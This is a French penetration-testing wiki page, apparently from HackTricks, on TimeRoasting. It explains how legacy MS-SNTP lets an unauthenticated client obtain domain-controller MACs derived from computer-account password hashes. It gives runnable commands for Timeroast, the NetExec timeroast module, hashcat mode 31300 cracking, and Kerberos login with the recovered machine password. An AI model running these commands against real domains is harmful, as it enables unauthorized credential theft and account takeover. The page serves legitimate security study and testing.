# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting exploite l'authentification MS-SNTP legacy. Un client non authentifié peut envoyer une requête de 68 octets contenant un RID choisi de compte d'ordinateur. Dans le chemin legacy exploitable, le contrôleur de domaine dérive l'authentificateur de réponse via Netlogon à l'aide du hash NT du compte d'ordinateur (le secret de mot de passe dérivé de MD4), fournissant à l'attaquant une paire challenge/MAC adaptée au password guessing hors ligne (mode 31300 de Hashcat).<sup>[[1]](#references)[[2]](#references)</sup>

Les sections 3.1.5.1 et 4 de MS-SNTP décrivent le comportement des requêtes et des réponses :<sup>[[1]](#references)</sup>
![TimeRoasting : consultez les sections 3.1.5.1 « Authentication Request Behavior » et 4 « Protocol Examples » de la spécification officielle MS-SNTP pour plus de détails](../../images/Pasted%20image%2020250709114508.png)
Lorsque `ExtendedAuthenticatorSupported` est false, la requête stocke le RID dans les 31 bits de poids faible du Key Identifier de l'authenticator et un bit de sélection dans le bit de poids fort. Le serveur vérifie la longueur de 68 octets, extrait le RID, demande à Netlogon de calculer les checksums candidats, en sélectionne un à l'aide de ce bit de poids fort, met à zéro le Key Identifier de la réponse et renvoie le checksum sélectionné.<sup>[[1]](#references)</sup>

Le crypto-checksum est basé sur MD5 (voir 3.2.5.1.1) et peut être cracké hors ligne, ce qui permet l'attaque de roasting.<sup>[[1]](#references)</sup>

## Comment attaquer

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts de Timeroasting par Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Attaque pratique (sans authentification) avec NetExec + Hashcat

- Le module `timeroast` de NetExec peut énumérer les RIDs des ordinateurs, récupérer les MACs MS-SNTP sans authentification et afficher des hashes `$sntp-ms$` prêts à être crackés :<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline avec le mode 31300 de Hashcat (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Le texte en clair récupéré correspond au mot de passe d’un compte d’ordinateur. Essayez-le directement en tant que compte machine avec Kerberos (-k) lorsque NTLM est désactivé :
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Notes opérationnelles
- Assurez-vous que l'heure est correcte avant d'utiliser les identifiants récupérés avec Kerberos. Préférez un client NTP maintenu tel que `chronyd`/`systemd-timesyncd` ; `ntpdate` est conservé ici comme commande courante en laboratoire : `sudo ntpdate <dc_fqdn>`.
- Si nécessaire, générez le fichier krb5.conf pour le realm AD : `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Mappez ultérieurement les RIDs vers les principals via LDAP/BloodHound dès que vous disposez d'un foothold authentifié.

## References

- [1] [MS-SNTP : Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – livre blanc Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — source du module `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Mode Hashcat 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
